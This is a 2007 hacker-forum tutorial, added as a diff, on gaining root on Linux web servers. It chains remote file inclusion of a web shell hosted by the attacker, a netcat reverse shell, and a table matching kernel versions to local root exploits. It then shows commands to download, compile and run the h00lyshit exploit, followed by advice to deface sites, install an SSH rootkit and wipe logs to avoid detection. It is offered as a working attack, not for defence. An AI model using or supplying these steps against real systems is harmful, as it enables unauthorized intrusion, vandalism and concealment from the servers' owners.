@@ -1,0 +1,194 @@
+=======================================================================
+R.F.I. Rooting Tutorial (Linux Server and Safe Mod: OFF)
+
+Author: An@sA_StAxtH
+Mail/MSN: admin@cyberanarchy.org/anasa_staxth@hotmail.com
+
+For Cyber Anarchy (Nov. 2007)
+=======================================================================
+
+You will need:
+
+- Vulnerable Site in R.F.I.
+- Shell for R.F.I. (e.g. c99, r57 or other)
+- NetCat
+- Local Root Exploit (depending on the kernel and the version)
+
+This aim tutorial is to give a very general picture in process of Rooting 
+in Linux Server with Safe Mod: OFF.
+
+-
+
+Suppose that we have found a site with R.F.I. vulnerability:
+
+http://www.hackedsite.com/folder/index.html?page=
+
+e can run shell exploiting Remote File Inclusion, as follows:
+
+http://www.hackedsite.com/folder/index.html?page=http://www.mysite.com/shells/evilscript.txt?
+
+where evilscript.txt is our web shell that we have already uploaded to 
+our site. (www.mysite.com in the folder: shells)
+
+After we enter in shell, first of all we will see the version of the kernel
+at the top of the page or by typing: uname - a in Command line.
+
+To continue we must connect with backconnection to the box. This can done with
+two ways if we have the suitable shell.
+
+We can use the Back-Connect module of r57/c99 shell or to upload a backconnector
+in a writable folder
+
+In most of the shells there is a backconnection feature without to upload the
+Connect Back Shell (or another one shell in perl/c). We will analyze the first
+way which is inside the shell (in our example the shell is r57).
+
+Initially we open NetCat and give to listen in a specific port (this port must 
+be correctly opened/forwarded in NAT/Firewall if we have a router) with the 
+following way:
+
+We will type: 11457 in the port input (This is the default port for the last versions
+of r57 shell). We can use and other port.
+
+We press in Windows Start -> Run -> and we type: cmd
+After we will go to the NetCat directory:
+
+e.g. 
+
+cd C:\Program Files\Netcat
+
+And we type the following command:
+
+nc -n -l -v -p 11457
+
+NetCat respond: listening on [any] 11457 ...
+
+In the central page of r57 shell we find under the following menu::: Net:: and 
+back-connect. In the IP Form we will type our IP (www.cmyip.com to see our ip if
+we have dynamic)
+
+In the Port form we will put the port that we opened and NetCat listens.
+
+If we press connect the shell will respond:
+
+Now script try connect to <IP here> port 11457 ...
+
+If our settings are correct NetCat will give us a shell to the server
+
+Now we wil continue to the Rooting proccess.
+
+We must find a writable folder in order to download and compile the Local
+Root Exploit that will give us root priviledges in the box. Depending on the version
+of the Linux kernel there are different exploits. Some times the exploits fail to run
+because some boxes are patched or we don't have the correct permissions.
+
+List of the exploits/kernel:
+
+2.4.17 -> newlocal, kmod, uselib24
+2.4.18 -> brk, brk2, newlocal, kmod
+2.4.19 -> brk, brk2, newlocal, kmod
+2.4.20 -> ptrace, kmod, ptrace-kmod, brk, brk2
+2.4.21 -> brk, brk2, ptrace, ptrace-kmod
+2.4.22 -> brk, brk2, ptrace, ptrace-kmod
+2.4.22-10 -> loginx
+2.4.23 -> mremap_pte
+2.4.24 -> mremap_pte, uselib24
+2.4.25-1 -> uselib24
+2.4.27 -> uselib24
+2.6.2 -> mremap_pte, krad, h00lyshit
+2.6.5 -> krad, krad2, h00lyshit
+2.6.6 -> krad, krad2, h00lyshit
+2.6.7 -> krad, krad2, h00lyshit
+2.6.8 -> krad, krad2, h00lyshit
+2.6.8-5 -> krad2, h00lyshit
+2.6.9 -> krad, krad2, h00lyshit
+2.6.9-34 -> r00t, h00lyshit
+2.6.10 -> krad, krad2, h00lyshit
+2.6.13 -> raptor, raptor2, h0llyshit, prctl
+2.6.14 -> raptor, raptor2, h0llyshit, prctl
+2.6.15 -> raptor, raptor2, h0llyshit, prctl
+2.6.16 -> raptor, raptor2, h0llyshit, prctl
+
+We will see the case of 2.6.8 Linux kernel. We will need the h00lyshit exploit.
+
+Some sites that we can find Local Root Exploits:
+
+www.milw0rm (Try Search: "linux kernel")
+
+Other sites: www.packetstormsecurity.org | www.arblan.com
+or try Googlin' you can find 'em all ;-)
+
+We can find writable folders/files by typing:
+
+find / -perm -2 -ls
+
+We can use the /tmp folder which is a standard writable folder
+
+We type: cd /tmp
+
+To download the local root exploit we can use a download command for linux like
+wget.
+
+For example:
+
+wget http://www.arblan.com/localroot/h00lyshit.c
+
+where http://www.arblan.com/localroot/h00lyshit.c is the url of h00lyshit.
+
+After the download we must compile the exploit (Read the instruction of the exploit
+before the compile)
+
+For the h00lyshit we must type:
+
+gcc h00lyshit.c -o h00lyshit
+
+Now we have created the executable file: h00lyshit.
+
+The command to run this exploit is:
+
+./h00lyshit <very big file on the disk>
+
+We need a very big file on the disk in order to run successfully and to get root.
+
+We must create a big file in /tmp or into another writable folder.
+
+The command is:
+
+dd if=/dev/urandom of=largefile count=2M
+
+where largefile is the filename.
+
+We must wait 2-3 minutes for the file creation
+
+If this command fails we can try:
+
+dd if=/dev/zero of=/tmp/largefile count=102400 bs=1024
+
+Now we can procced to the last step. We can run the exploit by typing:
+
+./h00lyshit largefile or
+
+./h00lyshit /tmp/largefile
+
+(If we are in a different writable folder and the largefile is created in /tmp)
+
+If there are not running errors (maybe the kernel is patched or is something wrong with
+exploit run or large file) we will get root
+
+To check if we got root:
+
+id or
+
+whoami
+
+If it says root we got root!
+
+Now we can deface/mass deface all the sites of the server or to setup a rootkit (e.g.
+SSHDoor) and to take ssh/telnet shell access to the server.
+
+We must erase all logs in order to be safe with a log cleaner. A good cleaner for this
+job is the MIG Log Cleaner.
+
+-
+
+<An@sA_StAxtH> <admin@cyberanarchy.org> * <www.cyberanarchy.org>
